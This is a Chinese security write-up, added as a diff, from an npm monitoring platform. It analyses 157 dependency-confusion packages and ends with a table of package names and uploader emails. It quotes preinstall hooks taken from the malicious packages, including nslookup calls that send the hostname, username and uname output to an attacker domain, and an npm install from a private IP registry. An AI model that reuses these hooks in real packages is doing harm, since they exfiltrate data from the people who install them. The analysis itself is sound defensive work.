@@ -1,0 +1,257 @@
+
+​        近两周，天问npm实时监测平台捕获到157个针对npm生态进行供应链攻击的恶意包，从攻击方式上来看这些包都属于依赖混淆类型的攻击，但是具体的攻击手段逐渐趋于成熟。从最简单的scripts字段命令执行到后续js文件混淆、加密执行，再到利用私有源投放恶意包的操作，执行恶意代码的方式越来越隐蔽。对于恶意代码执行后，攻击者如何有效拿回目标敏感信息的方式也多种多样，从直接使用post/get请求返回数据到利用DNS请求分片回传数据，再到对回传的数据进行对称加密。数据传输的方式也越发的隐蔽。
+前言
+​        2021年2月9日，国外安全研究员Alex Birsan公布了名为依赖混淆的攻击手法。这是一种利用开发人员错误配置以及npm等软件生态中包管理器的设计缺陷来实现的新型供应链攻击形式。自从这种攻击方式慢慢被安全研究者和恶意攻击者熟悉之后，在npm生态中与此相关的包就层出不穷。同时，具体的攻击触发方式也在朝着更加隐蔽的方法演变着。
+攻击手段演变史
+​        首先，所有的攻击的方式的起始都是需要拿到一个可以被依赖的关键包名，通过这个包名构建合适的版本号来使得恶意包通过依赖混淆的方式被目标安装，从而触发后续的攻击手段。目前看来后续的攻击手段都是以拿到用户机器上关键信息为主。例如主机名、内核信息、ipconfig信息、工作目录绝对路径、passwd信息等。
+
+危险的script字段​        在npm包的packages.json中可以指定script字段内容来构建命令的执行。换句话说，就是scripts字段中的命令具有执行shell命令的权限，所以较为浅显攻击所构建的命令都是直接写在scripts中。如恶意包@aznb/extension-gather@1.2.3的scripts字段所示
+1
+2
+3
+4
+"scripts" : {
+    "test" : "echo \"Error: no test specified\" && exit 1", 
+    "preinstall" : "nslookup a.x$(hostname).sub.0xczar.com && nslookup a.x$(whoami).sub.0xczar.com && nslookup a.x$(uname -a |base64).sub.0xczar.com"
+},
+执行恶意的js文件​        直接将指令构建在scripts字段中会不便于做更多的操作，所以攻击者将想要执行的代码写到一个js文件中，在scripts字段中直接执行这个js文件即可，如恶意包mswebauthn-polyfil@2.0.0的scripts字段所示，在安装阶段执行node index.js
+1
+2
+3
+4
+"scripts": {
+  "test": "echo \"Error: no test specified\" && exit 1",
+  "preinstall": "node index.js"
+},
+
+index.js内容如下所示，向特定网站返回安装该包机器的各类信息。
+将执行的文件进行js混淆​        对所要执行的文件进行js混淆是针对之前方法的改进，如果说以上的几种方式都还可以通过代码的静态扫描检测到，那么当代码进行了混淆之后，就很难在不行执行代码的情况下知道代码的意图是否恶意。这里我们以@dobux/hooks为例进行分析。这个包在早期发布的第一个版本中并未对代码进行混淆，这就让我们的分析更加容易了，同时也发现该包在回传所获取到的敏感信息时，对信息也进行了加密，得益于第一个未混淆的版本，该加密方式和公钥证书也被我们拿到。
+​        如下图所示，左侧为第一个未混淆版本1.3.0的代码，右侧为1.3.1版本中混淆后的代码。可以看到该npm包会拿到安装机器上的各类敏感参数发送回信息收集网站。
+所使用的加密算法和公钥证书如下所示：
+从私有源获取恶意包​        2021年1月6日晚，天问npm实时监测平台捕获到一个恶意包deneuve-test@1.0.0，分析之后发现其恶意行为并不在这个包之内，而是从私有源下载并安装一个私有包，所执行的操作的代码也是在私有包内。我们所捕获到的deneuve-test包的scripts字段如下:
+1
+2
+3
+4
+"scripts": {
+  "test": "echo \"Error: no test specified\" && exit 1",
+  "preinstall": "npm install bugbounty-package --registry=http://143.244.173.160/"
+}
+
+​        这个包会从指定的私有源http://143.244.173.160/下载一个名为bugbounty-package的包，这个包不存在于npmjs官方源上。其内容为执行一个shell脚本，获取用户敏感信息并返回。
+​        bugbounty-package的scripts内容如下，会在安装时执行一个名为test.sh的shell脚本。
+
+​        test.sh的内容如下：
+
+​        经过一番搜证，我们在snyk的一篇有关供应链依赖混淆的分析文章中发现了相同的关键词deneuve，以及相同的邮箱deneuve@wearehackerone.com。我们推测其为snyk的安全研究员，可能是在进行供应链安全相关的研究，或是为了赚取hackerone提供的赏金。
+​        此外，这个包的作者在上传之后的19分钟就将该包删除，得益于天问npm监测平台的实时性，第一时间捕获到了该恶意行为并进行了告警。
+结语
+​        在过去一年里，供应链攻击的频率逐渐提升，攻击的手段也愈发成熟。天问npm监测平台综合了npm依赖分析，实时源同步，天穹沙箱分析等功能，致力于发现npm生态中的供应链安全问题。在过去两周里，天问npm实时监测平台持续运行，共计发现157个npm恶意包。经过整理，这些恶意包的相关信息将在附录表格中给出。欢迎其他研究者一起交流分享所得，共同推动供应链安全的相关研究。
+附录
+天问npm监测平台近期发现的157个针对npm生态恶意包如下表所示。
+
+
+序号	包名	上传者	上传者邮箱	上传时间
+1	cheque-ocr@1.0.0	viajy.nvk1	viajy.nvk1@gmail.com	2021-12-22T10:52:59.224Z
+2	mendixnew@1.0.1	viajy.nvk1	viajy.nvk1@gmail.com	2021-12-22T17:09:10.351Z
+3	mendixnew@1.0.2	viajy.nvk1	viajy.nvk1@gmail.com	2021-12-22T17:10:52.314Z
+4	@aznb/extension-gather@1.1.2	dependency_confusion	log4jay@yandex.com	2021-12-23T13:39:11.212Z
+5	@aznb/extension-gather@1.2.3	dependency_confusion	log4jay@yandex.com	2021-12-23T13:40:01.454Z
+6	@aznb/extension-gather@1.2.4	dependency_confusion	log4jay@yandex.com	2021-12-23T13:46:38.351Z
+7	@aznb/extension-gather@1.2.5	dependency_confusion	log4jay@yandex.com	2021-12-23T13:49:05.498Z
+8	@aznb/extension-gather@1.2.6	dependency_confusion	log4jay@yandex.com	2021-12-23T13:51:05.275Z
+9	toolbox-script@2.0.0	nvkattacker2	nvkattacker2@gmail.com	2021-12-23T20:24:00.669Z
+10	npm-test-211221@6.0.0	ralkq5o9	ralkq5o9@linshiyouxiang.net	2021-12-24T02:48:58.298Z
+11	intercom-shim@99.0.1	bharathi2000	technicalegaltricks@gmail.com	2021-12-24T06:41:38.485Z
+12	npm-test-211221@7.0.0	ralkq5o9	ralkq5o9@linshiyouxiang.net	2021-12-24T06:46:37.740Z
+13	@ralkq5o9/npm-test-user@1.0.2	ralkq5o9	ralkq5o9@linshiyouxiang.net	2021-12-24T07:52:23.599Z
+14	@dqwdqwas/testconf@99.99.99	k0rt3z	efimiidanilove@gmail.com	2021-12-24T11:42:32.045Z
+15	@aznb/extension-gather@1.3.0	dependency_confusion	log4jay@yandex.com	2021-12-24T18:13:11.545Z
+16	@aznb/extension-gather@1.3.1	dependency_confusion	log4jay@yandex.com	2021-12-24T18:13:59.284Z
+17	@aznb/extension-gather@1.3.2	dependency_confusion	log4jay@yandex.com	2021-12-24T18:52:29.576Z
+18	tensorflow-js-website@0.0.1	gauravbhatia121	bhatiagaurav1211@gmail.com	2021-12-25T19:21:23.613Z
+19	privateinternal-a@1.2.2	borna_n	borna.nematzadeh123@gmail.com	2021-12-26T02:30:38.996Z
+20	yahoo-react-message-bar@2.500.52	hyflry	jesibo2817@ningame.com	2021-12-26T11:23:59.091Z
+21	yahoo-react-message-bar@3.12.32	hyflry	jesibo2817@ningame.com	2021-12-26T11:24:14.081Z
+22	yahoo-react-message-bar@2.0.222	hyflry	jesibo2817@ningame.com	2021-12-26T11:23:15.968Z
+23	yahoo-react-message-bar@2.20.52	hyflry	jesibo2817@ningame.com	2021-12-26T11:23:43.118Z
+24	kakakaaka@99.1.11	pzbmhpdgdvykhxeosq	pzbmhpdgdvykhxeosq@nthrw.com	2021-12-26T12:56:15.557Z
+25	webpack.js.org@0.1.2	gauravbhatia121	bhatiagaurav1211@gmail.com	2021-12-27T15:22:51.697Z
+26	ksectest123@0.0.2	tracesec	tracesec@163.com	2021-12-28T06:29:23.119Z
+27	ksectest123@0.0.3	tracesec	tracesec@163.com	2021-12-28T06:50:53.394Z
+28	ksectest123@0.0.4	tracesec	tracesec@163.com	2021-12-28T07:02:59.041Z
+29	ksectest123@0.0.5	tracesec	tracesec@163.com	2021-12-28T07:07:53.902Z
+30	ksectest123@0.0.6	tracesec	tracesec@163.com	2021-12-28T07:30:10.544Z
+31	kim-expand@1.0.0	tracesec	tracesec@163.com	2021-12-28T08:18:03.664Z
+32	kim-im@1.0.0	tracesec	tracesec@163.com	2021-12-28T08:18:47.222Z
+33	kim-login@1.0.0	tracesec	tracesec@163.com	2021-12-28T08:19:16.754Z
+34	blz-l33t-lib@2.0.0	confu-ha	bayixec505@xxyxi.com	2021-12-28T18:50:43.187Z
+35	@infra-node/kconf@1.0.0	infra-node	13egkhyc@linshiyouxiang.net	2021-12-29T05:08:16.650Z
+36	@infra-node/kconf@1.1.0	infra-node	13egkhyc@linshiyouxiang.net	2021-12-29T06:41:26.682Z
+37	@infra-node/kconf@1.2.0	infra-node	13egkhyc@linshiyouxiang.net	2021-12-29T06:43:12.627Z
+38	kastjs@0.4.4	kastjs	9ad2eieh@bytetutorials.net	2021-12-30T07:13:10.437Z
+39	@dobux/hooks@1.3.0	dobux	434xsml8@bytetutorials.net	2021-12-30T07:23:26.023Z
+40	blz-internal-pkg@2.0.0	some-internal	tospicarzo@vusra.com	2021-12-30T18:42:57.277Z
+41	blz-internal-pkg@3.0.0	some-internal	tospicarzo@vusra.com	2021-12-30T18:49:30.046Z
+42	blz-internal-pkg@6.6.6	some-internal	tospicarzo@vusra.com	2021-12-30T18:56:31.587Z
+43	informatica-monarch@1.0.0	incgbt	rootxrd@gmail.com	2021-12-30T20:54:33.249Z
+44	infa_ccgf-service-manager@1.0.2	incgbt	rootxrd@gmail.com	2021-12-30T21:46:51.540Z
+45	infa_ccgf-service-manager@1.0.3	incgbt	rootxrd@gmail.com	2021-12-30T21:55:38.237Z
+46	infa_ccgf-base-contract@1.0.0	incgbt	rootxrd@gmail.com	2021-12-30T21:58:19.396Z
+47	webpack.js.org@0.1.4	gaurav1234	gauravbhatia989@gmail.com	2021-12-31T16:51:18.305Z
+48	cd-interfaces@3.3.1	geekfreak_05	geekfreak1337@gmail.com	2022-01-01T11:37:35.059Z
+49	webpack.js.org@0.0.4	gaurav1234	gauravbhatia989@gmail.com	2022-01-01T15:08:59.212Z
+50	envoy-curses@0.0.0	gaurav1234	gauravbhatia989@gmail.com	2022-01-01T15:43:37.090Z
+51	zipmex-v2@1.0.1	cubanlife01	dondata007@gmail.com	2022-01-01T16:58:18.226Z
+52	envoy-curses@0.3.0	gaurav1234	gauravbhatia989@gmail.com	2022-01-01T18:44:19.773Z
+53	envoy-curses@0.9.0	gaurav1234	gauravbhatia989@gmail.com	2022-01-01T19:09:49.314Z
+54	envoy-curses@0.7.0	gaurav1234	gauravbhatia989@gmail.com	2022-01-01T19:24:23.307Z
+55	envoy-curses@0.1.0	gaurav1234	gauravbhatia989@gmail.com	2022-01-01T20:00:54.100Z
+56	cd-themes@5.3.1	geekfreak_05	geekfreak1337@gmail.com	2022-01-02T12:00:25.006Z
+57	webpack.js.org@0.1.0	gaurav1234	gauravbhatia989@gmail.com	2022-01-02T15:51:29.298Z
+58	accuracy-test@0.3.0	gaurav1234	gauravbhatia989@gmail.com	2022-01-02T19:38:18.338Z
+59	accuracy-test@1.0.0	gaurav1234	gauravbhatia989@gmail.com	2022-01-02T20:38:41.388Z
+60	iics-dev-proxy@1.0.0	rodpw3n	rodpwn@gmail.com	2022-01-02T21:54:28.243Z
+61	iics-utils@1.0.0	rodpw3n	rodpwn@gmail.com	2022-01-02T22:01:01.703Z
+62	iics-app-build@1.0.0	rodpw3n	rodpwn@gmail.com	2022-01-02T22:02:53.778Z
+63	iics-common@1.0.0	rodpw3n	rodpwn@gmail.com	2022-01-02T22:03:18.830Z
+64	iics-app-switcher@1.0.0	rodpw3n	rodpwn@gmail.com	2022-01-02T22:08:21.706Z
+65	iics-i18n@1.0.0	rodpw3n	rodpwn@gmail.com	2022-01-02T22:16:59.280Z
+66	sharechat-logger@1.2.1	24nitin	nitinkumar@sharechat.co	2022-01-03T05:45:04.041Z
+67	amey-blah@1.0.0	forest_dweller	forest_dweller@wearehackerone.com	2022-01-03T10:22:45.485Z
+68	xo-return-to-merchant@88.8.8	agentsteal	agentsteal@protonmail.com	2022-01-03T11:25:05.606Z
+69	ul-inline@88.8.8	agentsteal	agentsteal@protonmail.com	2022-01-03T11:50:40.102Z
+70	xo-login-components@88.8.8	agentsteal	agentsteal@protonmail.com	2022-01-03T12:06:58.840Z
+71	xo-tracking@88.8.8	agentsteal	agentsteal@protonmail.com	2022-01-03T12:10:00.806Z
+72	xo-beaver@88.8.8	agentsteal	agentsteal@protonmail.com	2022-01-03T12:11:08.278Z
+73	xo-device-info@88.8.8	agentsteal	agentsteal@protonmail.com	2022-01-03T12:12:03.540Z
+74	xo-member-components@88.8.8	agentsteal	agentsteal@protonmail.com	2022-01-03T12:12:56.023Z
+75	xo-address-components@88.8.8	agentsteal	agentsteal@protonmail.com	2022-01-03T12:13:48.798Z
+76	xo-page-components@88.8.8	agentsteal	agentsteal@protonmail.com	2022-01-03T12:14:39.832Z
+77	xo-validation@88.8.8	agentsteal	agentsteal@protonmail.com	2022-01-03T12:15:22.829Z
+78	xo-angular-shims-placeholder@88.8.8	agentsteal	agentsteal@protonmail.com	2022-01-03T12:16:11.454Z
+79	xo-credit-components@88.8.8	agentsteal	agentsteal@protonmail.com	2022-01-03T12:16:59.557Z
+80	xo-ui-components@88.8.8	agentsteal	agentsteal@protonmail.com	2022-01-03T12:17:41.568Z
+81	xo-shipping-change@88.8.8	agentsteal	agentsteal@protonmail.com	2022-01-03T12:18:28.505Z
+82	xo-form-components@88.8.8	agentsteal	agentsteal@protonmail.com	2022-01-03T12:21:09.219Z
+83	xo-tray-height@88.8.8	agentsteal	agentsteal@protonmail.com	2022-01-03T12:22:01.057Z
+84	xo-styles@88.8.8	agentsteal	agentsteal@protonmail.com	2022-01-03T12:22:36.703Z
+85	xo-jquery-mask-plugin@88.8.8	agentsteal	agentsteal@protonmail.com	2022-01-03T12:23:26.171Z
+86	xo-title@88.8.8	agentsteal	agentsteal@protonmail.com	2022-01-03T12:24:03.009Z
+87	xo-third-party-components@88.8.8	agentsteal	agentsteal@protonmail.com	2022-01-03T12:24:43.170Z
+88	xo-shipping-options@88.8.8	agentsteal	agentsteal@protonmail.com	2022-01-03T12:25:31.686Z
+89	gauravb1234@1.0.0	gaurav1234	gauravbhatia989@gmail.com	2022-01-03T13:06:57.369Z
+90	gauravb1234@2.0.0	gaurav1234	gauravbhatia989@gmail.com	2022-01-03T13:24:23.840Z
+91	reactnativeexampleapp@0.0.2	cubanlife01	dondata007@gmail.com	2022-01-03T17:27:41.771Z
+92	azure-accessplatform-windows-gpu@3.0.0	gaurav1234	gauravbhatia989@gmail.com	2022-01-03T17:02:35.638Z
+93	azure-accessplatform-windows-gpu@1.0.0	gaurav1234	gauravbhatia989@gmail.com	2022-01-03T17:36:06.700Z
+94	ing-orange-lu-luxtrust-token-authentication@88.8.8	agentsteal	agentsteal@protonmail.com	2022-01-03T18:13:00.619Z
+95	ing-orange-be-itsme-authentication@88.8.8	agentsteal	agentsteal@protonmail.com	2022-01-03T18:13:55.401Z
+96	ing-orange-be-ucr-authentication@88.8.8	agentsteal	agentsteal@protonmail.com	2022-01-03T18:14:48.475Z
+97	ing-orange-lu-luxtrust-smartcard-authentication@88.8.8	agentsteal	agentsteal@protonmail.com	2022-01-03T18:15:40.358Z
+98	ing-orange-lu-luxtrust-scan-authentication@88.8.8	agentsteal	agentsteal@protonmail.com	2022-01-03T18:16:28.005Z
+99	ing-orange-lu-luxtrust-mobile-authentication@88.8.8	agentsteal	agentsteal@protonmail.com	2022-01-03T18:17:09.978Z
+100	ing-orange-be-isabel-authentication@88.8.8	agentsteal	agentsteal@protonmail.com	2022-01-03T18:18:04.548Z
+101	webpack.js.org@1.0.0	gaurav1234	gauravbhatia989@gmail.com	2022-01-03T18:39:58.746Z
+102	crbt@2.0.0	gaurav1234	gauravbhatia989@gmail.com	2022-01-04T07:24:10.725Z
+103	site-vue@99.3.6	jimxuxx	bugrx00100@gmail.com	2021-12-29T01:34:56.370Z
+104	@kastjs/pc-layout@0.0.1-beta.6	kastjs	9ad2eieh@bytetutorials.net	2021-12-30T07:06:51.508Z
+105	@kastjs/cli@1.3.3	kastjs	9ad2eieh@bytetutorials.net	2021-12-30T07:08:36.619Z
+106	@kastjs/service-esdev@1.2.1	kastjs	9ad2eieh@bytetutorials.net	2021-12-30T07:10:04.239Z
+107	@kastjs/service-webpack5@1.2.2	kastjs	9ad2eieh@bytetutorials.net	2021-12-30T07:11:26.318Z
+108	ghs-payments@99.99.99	bharathi2002	shanmugabharathipentester010@gmail.com	2021-12-30T09:33:11.271Z
+109	kastjs@0.4.5	ycx5m90e	ycx5m90e@bytetutorials.net	2021-12-31T11:28:33.057Z
+110	@bsee/accordion@9.9.199	dependency_confusion	log4jay@yandex.com	2021-12-31T17:31:10.388Z
+111	@bsee/accordion@9.9.399	dependency_confusion	log4jay@yandex.com	2021-12-31T17:39:56.071Z
+112	kastjs@0.4.3	ycx5m90e	ycx5m90e@bytetutorials.net	2022-01-01T14:11:00.314Z
+113	kastjs@0.4.6	ycx5m90e	ycx5m90e@bytetutorials.net	2022-01-01T14:14:14.382Z
+114	ghs-payments@100.0.1	bharathi2002	shanmugabharathipentester010@gmail.com	2022-01-02T06:24:43.503Z
+115	kakakaakaaa@99.1.11	chesnjhtvygoarikgn	chesnjhtvygoarikgn@nthrl.com	2022-01-02T09:51:14.367Z
+116	domestic-market-bundle@1.675.0	hupw0rk	halegar111@ritumusic.com	2022-01-02T10:36:33.809Z
+117	domestic-market-bundle@2.676.0	hupw0rk	halegar111@ritumusic.com	2022-01-02T10:36:50.018Z
+118	domestic-market-bundle@4.678.0	hupw0rk	halegar111@ritumusic.com	2022-01-02T10:38:13.878Z
+119	domestic-market-bundle@5.679.0	hupw0rk	halegar111@ritumusic.com	2022-01-02T10:38:23.929Z
+120	domestic-market-bundle@3.677.0	hupw0rk	halegar111@ritumusic.com	2022-01-02T10:38:02.444Z
+121	domestic-market-bundle@6.680.0	hupw0rk	halegar111@ritumusic.com	2022-01-02T10:39:10.336Z
+122	domestic-market-bundle@7.681.0	hupw0rk	halegar111@ritumusic.com	2022-01-02T10:39:18.291Z
+123	domestic-market-bundle@8.682.0	hupw0rk	halegar111@ritumusic.com	2022-01-02T10:39:25.734Z
+124	domestic-market-bundle@932.682.0	hupw0rk	halegar111@ritumusic.com	2022-01-02T10:39:33.097Z
+125	wg5@1.455.0	hwrik	ketaye7672@swsguide.com	2022-01-02T10:48:12.008Z
+126	wg5@2.456.0	hwrik	ketaye7672@swsguide.com	2022-01-02T10:48:23.753Z
+127	wg5@912.462.0	hwrik	ketaye7672@swsguide.com	2022-01-02T10:50:31.234Z
+128	wg5@3.457.0	hwrik	ketaye7672@swsguide.com	2022-01-02T10:49:24.466Z
+129	wg5@4.458.0	hwrik	ketaye7672@swsguide.com	2022-01-02T10:49:36.964Z
+130	wg5@5.459.0	hwrik	ketaye7672@swsguide.com	2022-01-02T10:49:51.880Z
+131	wg5@6.460.0	hwrik	ketaye7672@swsguide.com	2022-01-02T10:50:05.018Z
+132	wg5@7.461.0	hwrik	ketaye7672@swsguide.com	2022-01-02T10:50:13.735Z
+133	wg5@8.462.0	hwrik	ketaye7672@swsguide.com	2022-01-02T10:50:20.497Z
+134	@infra-node/kconf@1.0.1	infra-node	13egkhyc@linshiyouxiang.net	2022-01-04T02:22:54.888Z
+135	@dobux/hooks@1.3.1	dobux	434xsml8@bytetutorials.net	2022-01-04T02:41:27.491Z
+136	personal-info@11.0.0	everyyearcoinbase	81654d6fc7@emailnax.com	2022-01-04T13:21:33.495Z
+137	@dobux/hooks@1.3.2	dobux	434xsml8@bytetutorials.net	2022-01-04T13:28:11.695Z
+138	@dobux/hooks@1.3.3	dobux	434xsml8@bytetutorials.net	2022-01-04T13:38:13.301Z
+139	@dobux/hooks@1.3.4	dobux	434xsml8@bytetutorials.net	2022-01-04T13:41:38.780Z
+140	mswebauthn-polyfil@2.0.0	gaurav12345	amazonprimefree1211@gmail.com	2022-01-04T18:56:28.449Z
+141	mswebauthn-polyfil@1.0.0	gaurav12345	amazonprimefree1211@gmail.com	2022-01-04T18:57:48.150Z
+142	mswebauthn-polyfill@1.0.0	gaurav12345	amazonprimefree1211@gmail.com	2022-01-04T18:58:31.017Z
+143	@radiodigitaal/air-design-system-shared@1.0.1928	biermeister	radiodigitaal@eclipso.de	2022-01-04T22:41:04.684Z
+144	@dobux/hooks@1.3.5	dobux	434xsml8@bytetutorials.net	2022-01-05T03:46:06.234Z
+145	@dobux/hooks@1.3.6	dobux	434xsml8@bytetutorials.net	2022-01-05T10:26:45.958Z
+146	ghs-payments@100.0.2	bharathi2002	shanmugabharathipentester010@gmail.com	2022-01-05T15:54:29.609Z
+147	tornado-pool@9.0.0	gaurav12345	amazonprimefree1211@gmail.com	2022-01-05T19:21:15.692Z
+148	tornado-pool@1.0.0	gaurav12345	amazonprimefree1211@gmail.com	2022-01-05T19:58:48.386Z
+149	sal-stack-lwip@8.0.0	gaurav12345	amazonprimefree1211@gmail.com	2022-01-06T06:53:38.065Z
+150	@dobux/hooks@1.3.7	dobux	434xsml8@bytetutorials.net	2022-01-06T07:06:03.718Z
+151	sal-stack-lwip@0.0.1	gaurav12345	amazonprimefree1211@gmail.com	2022-01-06T08:14:54.146Z
+152	lns-api-models@5.1.0	24nitin	nitinkumar@sharechat.co	2022-01-06T10:54:00.086Z
+153	deneuve-test@1.0.0	deneuveh123	deneuve+3@wearehackerone.com	2022-01-06T11:37:36.584Z
+154	@ktrace/core@0.2.30	ktrace	qvapqu5t@worldzipcodes.net	2022-01-06T12:12:09.400Z
+155	deneuve-test-1@1.0.0	deneuveh123	deneuve+3@wearehackerone.com	2022-01-06T12:14:08.684Z
+156	vgs-staging@99.4.6	zrvgs01	josemaimanis99@gmail.com	2022-01-07T00:51:45.244Z
+157	vgs-auth@99.6.6	zrvgs01	josemaimanis99@gmail.com	2022-01-07T00:57:19.666Z
+危险的script字段
+​        在npm包的packages.json中可以指定script字段内容来构建命令的执行。换句话说，就是scripts字段中的命令具有执行shell命令的权限，所以较为浅显攻击所构建的命令都是直接写在scripts中。如恶意包@aznb/extension-gather@1.2.3的scripts字段所示
+
+1
+2
+3
+4	"scripts" : {
+    "test" : "echo \"Error: no test specified\" && exit 1", 
+    "preinstall" : "nslookup a.x$(hostname).sub.0xczar.com && nslookup a.x$(whoami).sub.0xczar.com && nslookup a.x$(uname -a |base64).sub.0xczar.com"
+},
+执行恶意的js文件
+​        直接将指令构建在scripts字段中会不便于做更多的操作，所以攻击者将想要执行的代码写到一个js文件中，在scripts字段中直接执行这个js文件即可，如恶意包mswebauthn-polyfil@2.0.0的scripts字段所示，在安装阶段执行node index.js
+
+1
+2
+3
+4	"scripts": {
+  "test": "echo \"Error: no test specified\" && exit 1",
+  "preinstall": "node index.js"
+},
+index.js内容如下所示，向特定网站返回安装该包机器的各类信息。
+node index.js
+将执行的文件进行js混淆
+​        对所要执行的文件进行js混淆是针对之前方法的改进，如果说以上的几种方式都还可以通过代码的静态扫描检测到，那么当代码进行了混淆之后，就很难在不行执行代码的情况下知道代码的意图是否恶意。这里我们以@dobux/hooks为例进行分析。这个包在早期发布的第一个版本中并未对代码进行混淆，这就让我们的分析更加容易了，同时也发现该包在回传所获取到的敏感信息时，对信息也进行了加密，得益于第一个未混淆的版本，该加密方式和公钥证书也被我们拿到。
+​        如下图所示，左侧为第一个未混淆版本1.3.0的代码，右侧为1.3.1版本中混淆后的代码。可以看到该npm包会拿到安装机器上的各类敏感参数发送回信息收集网站。
+所使用的加密算法和公钥证书如下所示：
+@dobux/hooks
+从私有源获取恶意包
+​        2021年1月6日晚，天问npm实时监测平台捕获到一个恶意包deneuve-test@1.0.0，分析之后发现其恶意行为并不在这个包之内，而是从私有源下载并安装一个私有包，所执行的操作的代码也是在私有包内。我们所捕获到的deneuve-test包的scripts字段如下:
+
+1
+2
+3
+4	"scripts": {
+  "test": "echo \"Error: no test specified\" && exit 1",
+  "preinstall": "npm install bugbounty-package --registry=http://143.244.173.160/"
+}
+​        这个包会从指定的私有源http://143.244.173.160/下载一个名为bugbounty-package的包，这个包不存在于npmjs官方源上。其内容为执行一个shell脚本，获取用户敏感信息并返回。
+​        bugbounty-package的scripts内容如下，会在安装时执行一个名为test.sh的shell脚本。
+
+​        test.sh的内容如下：
+
+​        经过一番搜证，我们在snyk的一篇有关供应链依赖混淆的分析文章中发现了相同的关键词deneuve，以及相同的邮箱deneuve@wearehackerone.com。我们推测其为snyk的安全研究员，可能是在进行供应链安全相关的研究，或是为了赚取hackerone提供的赏金。
+​        此外，这个包的作者在上传之后的19分钟就将该包删除，得益于天问npm监测平台的实时性，第一时间捕获到了该恶意行为并进行了告警。
+
+http://143.244.173.160/
